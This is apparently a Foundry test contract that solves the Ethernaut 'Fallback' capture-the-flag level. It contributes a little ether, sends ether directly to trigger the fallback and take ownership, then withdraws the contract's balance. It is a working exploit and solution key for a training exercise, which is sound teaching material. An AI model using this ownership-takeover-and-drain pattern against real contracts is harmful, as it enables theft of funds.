// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {FallbackFactory} from "../src/levels/01-FallbackFactory.sol";
import {Fallback} from "../src/levels/01-Fallback.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract FallbackSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);

    function solution(Fallback target) internal virtual {
        target.contribute{value: 100 wei}();
        payable(target).call{value: 100 wei, gas: 30000}(bytes(""));
        target.withdraw();
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackContract = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(fallbackContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
